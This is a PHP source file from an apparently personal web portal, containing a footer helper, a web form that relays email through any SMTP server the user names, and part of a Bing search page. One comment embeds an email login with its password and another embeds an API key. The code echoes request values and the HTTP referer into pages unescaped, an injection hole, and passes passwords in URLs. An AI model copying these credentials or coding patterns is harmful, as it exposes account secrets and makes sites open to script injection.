onmouseover="this.style.backgroundColor='<?php  echo $mouseoverbgcolor ;?>';" onmouseout="this.style.backgroundColor='<?php  echo $mouseoutbgcolor; ?>';" onmousedown="this.style.backgroundColor='<?php echo $mouseoverbgcolor;?>';"
<?php	
	}
}

function selectarea($mouseoverbgcolor,$mouseoutbgcolor,$id=''){
	if($id!=''){
?>onmouseover="javascript:o<?php  echo $id ;?>=document.getElementById('<?php  echo $id ;?>').value;this.style.backgroundColor='#f9f9f9';" onmouseout="this.style.backgroundColor='';" onmousedown="javascript:if(document.getElementById('<?php  echo $id ;?>').value==o<?php  echo $id ;?>)document.getElementById('<?php  echo $id ;?>').value='';document.getElementById('<?php  echo $id ;?>').onmouseover='';this.style.backgroundColor='#f9f9f9';" onBlur="javascript:if(document.getElementById('<?php  echo $id ;?>').value=='')document.getElementById('<?php  echo $id ;?>').value=o<?php  echo $id ;?>;this.style.backgroundColor='';"<?php 
}elseif($id==''){
?>
onmouseover="this.style.backgroundColor='<?php  echo $mouseoverbgcolor ;?>';" onmouseout="this.style.backgroundColor='<?php  echo $mouseoutbgcolor; ?>';" onmousedown="this.style.backgroundColor='<?php echo $mouseoverbgcolor;?>';"
<?php	
	}
}


function selcolor($skincolor,$type='tdbg'){
	//return;
	                	if (!is_wap()){
$skincolorarray=$this->skincolorarray($skincolor);
?>
FILTER: progid:DXImageTransform.Microsoft.Gradient(gradientType=0,startColorStr=<?php  echo $skincolorarray[$type] ?>,endColorStr=#ffffff);background:-moz-linear-gradient(top,<?php  echo $skincolorarray[$type] ?>,#ffffff);background:-webkit-gradient(linear, 0% 0%, 0% 100%,from(<?php  echo $skincolorarray[$type] ?>), to(#ffffff));background-image: -webkit-gradient(linear,left bottom,left top,color-start(0, <?php  echo $skincolorarray[$type] ?>),color-stop(1, #ffffff));filter:  progid:DXImageTransform.Microsoft.gradient(GradientType=0,startColorstr='<?php  echo $skincolorarray[$type] ?>', endColorstr='#ffffff');-ms-filter: 'progid:DXImageTransform.Microsoft.gradient(GradientType=0,startColorstr=<?php  echo $skincolorarray[$type] ?>, endColorstr=#ffffff)';background: -webkit-linear-gradient(top, <?php  echo $skincolorarray[$type] ?>, #ffffff);background: -o-linear-gradient(top, <?php  echo $skincolorarray[$type] ?>, #ffffff);background: -ms-linear-gradient(top, <?php  echo $skincolorarray[$type] ?>, #ffffff);
<?php 
}
}


function footer(){
//$skincolor = selstyle(trim(request("skin")));
?><table width="90%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="center" height="30">
                <?php  date_default_timezone_set('UTC');?>
                <?php 
                if (0){
                ?>
                <div class="addthis_toolbox addthis_default_style">       
                       	<?php  echo "Hosted by ".strtoupper($_SERVER["SERVER_NAME"])." ".date("Y-m-d");
                    	
                       	?>
                        <a style='color:#444444' href="skype:+990009369991439853" target='_blank'><?php echo formatchar('呼我');?></a>
								<?php
							
								?>
                </div>
                <?php 
                }
                else{
                	if (!is_wap()){
                ?>
                <noscript>                
                <div class="addthis_toolbox addthis_default_style" align='center'>
                                <div id="google_translate_element"></div><script type="text/javascript">
function googleTranslateElementInit() {
  new google.translate.TranslateElement({pageLanguage: 'zh-CN', layout: google.translate.TranslateElement.InlineLayout.HORIZONTAL, multilanguagePage: true}, 'google_translate_element');
}
</script><script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
              </noscript>  
                <table>
                        <tr>
                                <td>
                        		<?php  echo "Hosted by ".strtoupper($_SERVER["SERVER_NAME"])." ".date("Y-m-d");
                        		
                        		?>
                                </td>
                                <td height="30">
                                        <noscript>
                                        <script type="text/javascript">var addthis_config = {"data_track_clickback":true};</script>
                                        <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid=x3193"></script>
                                        </noscript>

		                                    <a style='color:#444444' href="http://www.addthis.com/bookmark.php?v=250&amp;pubid=x3193" class="addthis_button_compact" target="_blank"><?php echo formatchar('分享');?></a>
                                        <a style='color:#444444' href="skype:+990009369991439853"><?php echo formatchar('呼我');?></a>

                                        

                                </td>                                        
                        </tr>
                </table>  
                <noscript>
                                         <div align='center'>
<script type="text/javascript">
var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F3127873a3c633cebeeedb5861d582211' type='text/javascript'%3E%3C/script%3E"));
</script>
																				</DIV>                              
                </noscript>
                </div>
                <?php 
                	}
                	else{

                ?>
                
                <table>
                        <tr>
                                <td>

                        		<?php  echo "Hosted by ".strtoupper($_SERVER["SERVER_NAME"])." ".date("Y-m-d");
                        		
                        		?>
                                </td>
                                <td height="30"> 
                                        <a style='color:#444444' href="http://www.addthis.com/bookmark.php?v=250&amp;pubid=x3193" class="addthis_button_compact" target="_blank"><?php echo formatchar('分享');?></a>
                                        <a style='color:#444444' href="ext:tel/+85258083882"><?php echo formatchar('呼我');?></a>
                                </td>                                        
                        </tr>
                </table>  


                </div>
                <?php 
		
                	}
                }
                ?>
                </td>
        </tr>   
</table>
<?php 
}

}
?>

<?php 
function smtp() {
// http://server/?api=smtp&server=smtp.163.com&port=25&sname=X3193&semail=xcy6272003@163.com&spwd=EUIfgwe7&rname=X3193&remail=xcy6272003@126.com&bodytype=HTML&timeout=300&cc=xcy6272003@126.com&content=jjjjjjjjjjjjjj<br>jjjjjjjjj<div>jjjjjj</div>&subject=66666666666666&bcc=xcy6272003@126.com&aheader=&timeout=300
header('Content-Type: text/html; charset=gb2312');

?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - SMTP");
$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                         IF(!is_wap())
                        	sellink("主页|插件|搜索|域名|FTP|读书|游戏|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|FTP|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
<table width="95%" height="3" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<?php 
switch (trim(request('action'))) {  // case start
        case "sendmail":
                        //echo encodeuri(trim($_SERVER['HTTP_REFERER']));
                        //return;
                        if (trim(request('server'))=="" || trim(request('semail'))=="" || trim(request('remail'))=="" || trim(request('semail'))=="" || trim(request('spwd'))==""){
                                AlertBack ("信息填写不完全！" ,1);
                        }
                        //print_r($_POST);
                        //return;
                        $smtpserver = trim(request('server'));
                        //SMTP服务器 
                        $smtpserverport =trim(request('port'));
                        //SMTP服务器端口 
                        $smtpusermail = trim(request('semail'));
                        //SMTP服务器的用户邮箱 
                        $smtpemailto = trim(request('remail'));
                        $smtpemailtoname = trim(request('rname'));
                        //发送给谁 
                        $smtpuser = trim(request('semail'));
                        $smtpusername = trim(request('sname'));
                        //SMTP服务器的用户帐号 
                        $smtppass = trim(request('spwd'));
                        //SMTP服务器的用户密码 
                        $mailsubject = trim(request('subject'));
                        //邮件主题 
                        $mailbody = iconv("utf-8","gb2312",decodeuri(trim(request('content'))));
                        //邮件内容 
                        $mailtype = trim(request('bodytype'));
                        //邮件格式（HTML/TXT）,TXT为文本邮件 
                        $cc = trim(request('cc')) ; 
                        $bcc = trim(request('bcc')) ; 
                        $additional_headers = trim(request('aheader'));
                        $timeout = trim(request('timeout'));
                        ########################################## 
                        $smtp = new smtp($smtpserver,$smtpserverport,true,$smtpuser,$smtppass);
                        //这里面的一个true是表示使用身份验证,否则不使用身份验证. 
                        if (0){
                                $smtp->debug = false;
                        }       
                        elseif (strtolower(trim($_SERVER['SERVER_NAME'])) == "web.x3193.cz.cc"){
                                $smtp->debug = false;
                        }
                        //是否显示发送的调试信息 
                        if ($smtp->sendmail($smtpemailto,$smtpemailtoname, $smtpuser,$smtpusername, $mailsubject, $mailbody, $mailtype, $cc, $bcc, $additional_headers,$timeout)){
                                $timeout = "5000";
                                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                        电子邮件发送成功！<?php  echo $timeout/1000?> 秒后返回上一页                
                </td>
        </tr>   
                                <?php 
                                echo "<p align=center><script>window.setTimeout(\"location.href=\'".trim($_SERVER['HTTP_REFERER'])."\'\",".$timeout.");</script></p>"
                                ?>
</table>                        
                                <?php 
                        }       
                        else
{
                                $timeout = "5000";
                                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                        电子邮件发送失败！<?php  echo $timeout/1000?> 秒后返回上一页                
                </td>
        </tr>   
                                <?php 
                                echo "<p align=center><script>window.setTimeout(\"location.href=\'".trim($_SERVER['HTTP_REFERER'])."\'\",".$timeout.");</script></p>"
                                ?>
</table>                        
                                <?php 
                        }       
                        break;
        case "createmail":
                        if (trim(request("logout")) != ""){
                                session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                                session_register("smtp");
}                                 

                                $_SESSION["smtp"]=array('uname' => '', 'pwd' => '','server' => '', 'port' => '');                               
                                //session_register("uname"); 
                                //$_SESSION["uname"] = "";      
                                //session_register("pwd"); 
                                //$_SESSION["pwd"] = "";        
                                redirect(scriptpath()."?api=smtp&skin=".$skincolor."&uname=&pwd=&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                                break;
                        }
                        elseif (trim($_POST["uname"]) != "" && trim($_POST["pwd"]) != ""){
                                If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                                        if (trim(request("checkcode")) != ""){
                                                AlertBack("四位验证码错误！" , 1);
                                                break;
                                        }       
                                        elseif (trim(request("checkcode")) == ""){
                                                AlertBack("四位验证码为空！" , 1);
                                                break;
                                        }               
                                }
                                session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                                session_register("smtp");
} 
                                $_SESSION["smtp"]=array('uname' => trim(request("uname")), 'pwd' => trim(request("pwd")),'server' => trim(request("server")), 'port' => trim(request("port")));                         
                                //session_register("uname"); 
                                //$_SESSION["uname"] = trim(request("uname"));  
                                //session_register("pwd"); 
                                //$_SESSION["pwd"] = trim(request("pwd"));      
                                //session_register("server"); 
                                //$_SESSION["server"] = trim(request("server"));        
                                //session_register("port"); 
                                //$_SESSION["port"] = trim(request("port"));    
                                redirect(scriptpath()."?api=smtp&skin=".$skincolor."&uname=".encodeuri(base64_encode(trim($_POST["uname"])))."&pwd=".encodeuri(base64_encode(trim($_POST["pwd"])))."&server=".encodeuri(base64_encode(trim($_POST["server"])))."&port=".trim($_POST["port"])."&action=".trim(request("action"))."&checkcode=".trim(request("checkcode"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        } 
                        elseif ($_SESSION["smtp"]["uname"] != "" && $_SESSION["smtp"]["pwd"] != "" && $_SESSION["smtp"]["server"] != "" && $_SESSION["smtp"]["port"] != "" && trim(request("uname")) == "" && trim(request("pwd")) == "" && trim(request("server")) == "" && trim(request("port")) == ""){
                                redirect(scriptpath()."?api=smtp&skin=".$skincolor."&uname=".encodeuri(base64_encode(trim($_SESSION["smtp"]["uname"])))."&pwd=".encodeuri(base64_encode(trim($_SESSION["smtp"]["pwd"])))."&server=".encodeuri(base64_encode(trim($_SESSION["smtp"]["server"])))."&port=".encodeuri(base64_encode(trim($_SESSION["smtp"]["port"])))."&action=".trim(request("action"))."&checkcode=".trim(request("checkcode"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                                break;
                        }       
                        elseif (trim(request("uname")) == "" || trim(request("pwd")) == ""){
                                redirect(scriptpath()."?api=smtp&skin=".$skincolor."&uname=&pwd=&action=&checkcode=".trim(request("checkcode"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                                break;
                        }
                        ?>
<table width="95%" height="35" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
<FORM ACTION="<?php echo scriptpath()."?api=smtp&action=sendmail&skin=".$skincolor;?>" METHOD=POST NAME="smtp">
        <tr class="tdtbg">
                <td align="left">
                        &nbsp接收方地址信息：
                </td>
        </tr>   
</table>

<table width="95%" height="70" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="center" width="20%">
                        收方呢称：
                </td>
                <td align="center" width="80%">
                        <input onmouseover="this.style.backgroundColor='#FCFC9D';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='#FCFC9D';"
 style="width:90%;height:22px" type="text" name="rname" value="" />
                </td>
        </tr>   
        <tr>
                <td align="center">
                        收方地址：
                </td>
                <td align="center">
                        <input onmouseover="this.style.backgroundColor='#FCFC9D';" onmouseouqdt="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='#FCFC9D';"
 style="width:90%;height:22px" type="text" name="remail" value="" />
                </td>
        </tr>   
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="center" width="40%" height="5">
                </td>
        </tr>   
</table>

<table width="95%" height="35" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left">
                        &nbsp发送方SMTP服务器信息：
                </td>
        </tr>   
</table>

<table width="95%" height="159" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="center" width="20%">
                        SMTP域名：
                </td>
                <td align="center" width="80%">
                        <input onmouseover="this.style.backgroundColor='#FCFC9D';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='#FCFC9D';"
 style="width:90%;height:22px" type="text" name="server" maxlength="" value="<?php echo base64_decode(trim(request("server")));?>" />
                        <input onmouseover="this.style.backgroundColor='#FCFC9D';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='#FCFC9D';"
 style="width:90%;height:22px" type="hidden" name="bodytype" maxlength="" value="html" />
                </td>
        </tr>   
        <tr>
                <td align="center">
                        SMTP端口：
                </td>
                <td align="center">
                        <input onmouseover="this.style.backgroundColor='#FCFC9D';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='#FCFC9D';"
 style="width:90%;height:22px" type="text" name="port" maxlength="" value="<?php echo trim(request("port"));?>" />
                </td>
        </tr>   
        <tr>
                <td align="center">
                        SMTP昵称：
                </td>
                <td align="center">
                        <input onmouseover="this.style.backgroundColor='#FCFC9D';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='#FCFC9D';"
 style="width:90%;height:22px" type="text" name="sname" value="" />
                </td>
        </tr>   
        <tr>
                <td align="center">
                        SMTP地址：
                </td>
                <td align="center">
                        <input onmouseover="this.style.backgroundColor='#FCFC9D';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='#FCFC9D';"
 style="width:90%;height:22px" type="text" name="semail" value="<?php echo base64_decode(trim(request("uname")));?>" />
                </td>
        </tr>   
        <tr>
                <td align="center">
                        SMTP密码：
                </td>
                <td align="center">
                        <input onmouseover="this.style.backgroundColor='#FCFC9D';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='#FCFC9D';"
 style="width:90%;height:22px" type="password" name="spwd" value="<?php echo base64_decode(trim(request("pwd")));?>" />
                </td>
        </tr>   
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="center" width="40%" height="5">
                </td>
        </tr>   
</table>
<table width="95%" height="35" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left">
                        &nbsp抄送方地址信息：
                </td>
        </tr>   
</table>

<table width="95%" height="70" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="center" width="20%">
                        抄方地址：
                </td>
                <td align="center" width="80%">
                        <input onmouseover="this.style.backgroundColor='#FCFC9D';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='#FCFC9D';"
 style="width:90%;height:22px" type="text" name="cc" value="" maxlength="" />
                </td>
        </tr>   
        <tr>
                <td align="center">
                        密抄地址：
                </td>
                <td align="center">
                        <input onmouseover="this.style.backgroundColor='#FCFC9D';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='#FCFC9D';"
 style="width:90%;height:22px" type="text" name="bcc" value="" maxlength="" />
                </td>
        </tr>   
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="center" width="40%" height="5">
                </td>
        </tr>   
</table>
<table width="95%" height="35" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left">
                        &nbsp邮件详细内容：
                </td>
        </tr>   
</table>
<table width="95%" height="170" align="center" valign="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="center" width="20%" height="40">
                        邮件主题：
                </td>
                <td align="center" width="80%">
                        <input onmouseover="this.style.backgroundColor='#FCFC9D';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='#FCFC9D';"
 style="width:90%;height:22px;" type="text" id="subject" name="subject" maxlength="" value="" />
                </td>
        </tr>   
        <tr>
                <td align="center" height="40">
                        验证码：
                </td>
                <td align="center">
                        <input onmouseover="this.style.backgroundColor='#FCFC9D';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='#FCFC9D';"
 style="width:80%;height:22px" type="text" maxlength="4" id="checkcode" name="checkcode" maxlength="4" onKeyUp="value=value.replace(/[^0-9,]/g,'')" value="" />
                        &nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="13" src="?api=checkcode" border="0"></a>
                </td>
        </tr>   
        <tr>
                <td align="center" valign="top">
                        邮件内容：
                </td>
                <td align="center" width="80%">
                <?php 
                $editor = new editor_class;
                $editor->editorCSS();
                $editor->editorLoad();
                $editor->editorControl("smtp");
                $editor->editorMain("smtp",scriptpath()."?api=smtp&action=sendmail&skin=".$skincolor,"90%","");
                ?>
                </td>
        </tr>   
</table>        
                        <?php                       
                break;  
        default:
                        ?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath();?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="35" valign="center">
                <td align="center" valign="center" id="google">
                        <form action="<?php echo ScriptPath();?>?api=smtp&action=createmail&skin=<?php  echo $skincolor;?>&c=<?php echo encodeuri(trim(request("c")))?>&t=<?php echo encodeuri(trim(request("t")))?>&u=<?php echo encodeuri(trim(request("u")))?>" method="post" name="smtp">
                        &nbsp服务器：<input type="text" class="text" name="server" value="" style="height:20px;width:10%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>>  
                        &nbsp用户名：<input type="text" class="text" name="uname" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>>  
                        &nbsp密码：<input type="password" class="text" name="pwd" value="" style="height:20px;width:10%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>> 
                        &nbsp端口：<input type="text" class="text" name="port" value="" style="height:20px;width:4%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>>  
                        &nbsp验证码：<input <?php  $style->input("#FCFC9D",""); ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>
        </tr>   
</table>
<?php 
                break;
}       

$style->footer();
//exit;
}
?>

<?php 

// Bing Search Api
// Developer Website : http://cn.bing.com/developers/appids.aspx
// ApiKey : 0F2CE2474CC3203A198DE98006CA5810A8C4BC9B
// Version : V2.0

// Model:
// start
//  switch ... break
// end

function bing() { // bing function start 
if (trim(request('action')) == "tts"){
    Header("Content-Type: audio/x-wav; samplerate=16000");
		if(trim(request("download"))!=''){    
    	header("Content-Disposition: attachment; filename=".trim(time()).".wav");	
    }
    $bing_search = new bing_class();
    print_r($bing_search->bingtts(trim(request('content')),trim(request('lang'))));//"Web,网页|News,新闻|Image,图片";
    exit;
}else{
header('Content-Type: text/html; charset=gb2312');
}

//echo $_COOKIE["X3193"]['global'][$iplimiter]['verify']['result'].$_COOKIE["X3193"]['global'][$iplimiter]['verify']['success'];
//echo trim($_SERVER["HTTP_REFERER"]).'kkk';

// 启用翻译
if (trim(request('transfrom')) != "")
        $Sources = "Translation";
elseif (trim(request('Sources')) != "")
        $Sources = trim(request('Sources'));
else
        $Sources = 'Web';

//$BingAppId = 'm6JvX/s5J8RF97Ip7um8pPRR0Kesh+G7HYSH/QiN3X0=';

?>
<head>
<?php 
$style = new css();
$style->ico();

if (trim(request('api')) == "" && trim(request('Query')) == "" && $Sources != "News" && !is_wap())
	$query = ("试玩游戏赚钱");
elseif ($Sources == "News" && trim(request('Query')) == "")
	$query = (date('Y').date('m').date('d'));
elseif (trim(request('api')) == "discuz" && trim(request('Query')) == "" && !is_wap())
	$query = ("试玩游戏赚钱");
elseif(trim(request('cento'))=='360chrom')
	$query = iconv('utf-8','gb2312',trim(request('Query')));
else
	$query = trim(request('Query'));
        
if (trim($_SERVER['QUERY_STRING']) == "")
        $style->title("X3193 - ".formatchar("网络"));
elseif ($query != "")
        $style->title("X3193 - ".formatchar("搜索 -> ".$query));
else
        $style->title("X3193 - ".formatchar("搜索"));
        
$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行        
?>

<?php 

// 每页条数
if (trim(request('api')) == "" && trim(request('Query')) == "" && !is_wap())
        $pagesize = 50;
elseif (trim(request('api')) == "bing" && $Sources == "News")
        $pagesize = 15;
elseif (trim(request('pagesize')) == "")
        $pagesize = 30;
elseif (trim(request('pagesize')) > 50)
        $pagesize = 50;
else
        $pagesize = trim(request('pagesize'));


if (trim(request("page")) != "" && is_numeric(trim(request("page"))) !== false){
        $page = floor(trim(request("page")));
}       
else{
        $page = floor("1");
}

if (trim(request('market')) != "")
        $marketstr = trim(request('market'));
elseif (trim(request('market')) == "")
        $marketstr = 'zh-CN';

if (trim(request('tolang')) != "")
        $tolang = trim(request('tolang'));
elseif (trim(request('tolang')) == "")
        $tolang = 'zh-CHS';

$tag = New TagAction(); 
switch (trim(request('action'))) {  // case start
        case "getinfo":
                $tag->getinfo(httppath()."?api=bing&skin=".$skincolor."&transfrom=".encodeuri(trim($_GET['transfrom']))."&market=".encodeuri(trim($_GET['market']))."&action=Cento",'link','780','500');
                break;           
        case "tts":

                break;
        case "imageview":

                break;                
        case "Cento":
                $tag->jscento();
?>

<table width="100%" height="90%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="center" valign="center">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                        	 IF(!is_wap())
                        	sellink("主页|插件|搜索|域名|FTP|游戏|视频|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|FTP|视频",$skincolor);
                        ?>
                </td>           
        </tr>
</table>
<form action="<?php  echo ScriptPath(); ?>?api=bing" method="GET" name="bing">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="center" height="35" class="tdtbg" valign="middle">
                        <input name="Query" value="<?php  echo $query; ?>" style="height:20px;width:90px;font-size:11px" <?php  $style->input("#f9f9f9",""); ?>>
                        网页<input type="radio" name="Sources" value="web" <?php  if ($Sources=="web") echo 'checked'; elseif ($Sources=="") echo 'checked'; ?>> 
                        新闻<input type="radio" name="Sources" value="news" <?php if ($Sources=="news") echo 'checked'; ?>> 
                        图片<input type="radio" name="Sources" value="image" <?php if ($Sources=="image") echo 'checked'; ?>> 
                        视频<input type="radio" name="Sources" value="video" <?php if ($Sources=="video")  echo 'checked'; ?>> 
                        手机<input type="radio" name="Sources" value="MobileWeb" <?php if ($Sources=="MobileWeb")  echo 'checked'; ?>> 
                        <noscript>
                        电话<input type="radio" name="Sources" value="phonebook" <?php if ($Sources=="phonebook") ?>checked onclick="vbscript:getphone()"> 
                        问答<input type="radio" name="Sources" value="instantanswer" <?php if ($Sources=="InstantAnswer") ?>checked> 
                        </noscript>
                        <SELECT name="transfrom" size="1" <?php  $style->selectarea("#f9f9f9",""); ?> style="width:71px;height:16px;font-size:12px">
                        <OPTION VALUE="">源语种</OPTION>
                        <?php 
                        $langfrom = "Ar,Arabic|zh-CHS,简体中文|zh-CHT,繁w中文|Nl,Dutch|En,English|Fr,French|De,German|It,Italian|Ja,Japanese|Ko,Korean|Pl,Polish|Pt,Portuguese|Ru,Russian|Es,Spanish";
                        for($langfromi = 0; $langfromi < count(split("[|]",$langfrom));$langfromi++){
                        ?>
                                <OPTION VALUE="<?php  echo arrmember(split("[,]",arrmember(split("[|]",$langfrom),$langfromi)),(0));?>" <?php  if (trim($_GET['transfrom']) == arrmember(split("[,]",arrmember(split("[|]",$langfrom),$langfromi)),0)) echo 'selected';?>><?php  echo arrmember(split("[,]",arrmember(split("[|]",$langfrom),$langfromi)),(1));?></OPTION>
                        <?php 
                        }
                        ?>
                        <OPTION VALUE="">不选择...</OPTION>
                        </SELECT>
                        <SELECT name="market" size="1" <?php  $style->selectarea("#f9f9f9","") ?> style="width:175px;height:16px;font-size:12px">
                        <?php 
                        $market = "zh-CN,Chinese - China|zh-HK,Chinese - Hong Kong SAR|zh-TW,Chinese - Taiwan|ar-XA,Arabic - Arabia|bg-BG,Bulgarian - Bulgaria|cs-CZ,Czech - Czech Republic|da-DK,Danish - Denmark|de-AT,German - Austria|de-CH,German - Switzerland|de-DE,German - Germany|el-GR,Greek - Greece|en-AU,English - Australia|en-CA,English - Canada|en-GB,English - United Kingdom|en-ID,English - Indonesia|en-IE,English - Ireland|en-IN,English - India|en-MY,English - Malaysia|en-NZ,English - New Zealand|en-PH,English - Philippines|en-SG,English - Singapore|en-US,English - United States|en-XA,English - Arabia|en-ZA,English - South Africa|es-AR,Spanish - Argentina|es-CL,Spanish - Chile|es-ES,Spanish - Spain|es-MX,Spanish - Mexico|es-US,Spanish - United States|es-XL,Spanish - Latin America|et-EE,Estonian - Estonia|fi-FI,Finnish - Finland|fr-BE,French - Belgium|fr-CA,French - Canada|fr-CH,French - Switzerland|fr-FR,French - France|he-IL,Hebrew - Israel|hr-HR,Croatian - Croatia|hu-HU,Hungarian - Hungary|it-IT,Italian - Italy|ja-JP,Japanese - Japan|ko-KR,Korean - Korea|lt-LT,Lithuanian - Lithuania|lv-LV,Latvian - Latvia|nb-NO,Norwegian - Norway|nl-BE,Dutch - Belgium|nl-NL,Dutch - Netherlands|pl-PL,Polish - Poland|pt-BR,Portuguese - Brazil|pt-PT,Portuguese - Portugal|ro-RO,Romanian - Romania|ru-RU,Russian - Russia|sk-SK,Slovak - Slovak Republic|sl-SL,Slovenian - Slovenia|sv-SE,Swedish - Sweden|th-TH,Thai - Thailand|tr-TR,Turkish - Turkey|uk-UA,Ukrainian - Ukraine";
                        for ($marketi = 0; $marketi < count(split("[|]",$market));$marketi++){
                        ?>
                                <OPTION VALUE="<?php  echo arrmember(split("[,]",arrmember(split("[|]",$market),($marketi))),(0))?>" <?php  if (trim($_GET['market']) == arrmember(split("[,]",arrmember(split("[|]",$market),$marketi)),0)) echo 'selected';?>><?php  echo arrmember(split("[,]",arrmember(split("[|]",$market),($marketi))),(1))?></OPTION>
                        <?php 
                        }
                        ?>
                        </SELECT>                       
                        <input type="text" name="pagesize" value="<?php echo $pagesize?>" style="width:19px;height:19px;font-size:12px" <?php  $style->input("#f9f9f9","") ?>> 
                        <input type="hidden" class="text" name="skin" value="<?php echo $skincolor;?>" size="1"> 
                        <input type="submit" class="button" name="btnSubmit" value=" Go ">
                </td>
        </tr>   
</table>
</form>
<?php 
                $tag->jscentoload("bing","Query","Cento");
                break;
        default:
        				//print_r(json_encode($_POST).'mmm');
                $postdata = "";
                $soSources = $Sources;
                ?>

<table width="100%" height="90%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="center" valign="center">
<table width="95%" height="30" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg">
                <td align="left" style="<?php $style->selcolor($skincolor,'tdbg');?>">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="<?php $style->selcolor($skincolor,'tdbg');?>">             
                        <?php  
                        	 IF(!is_wap())
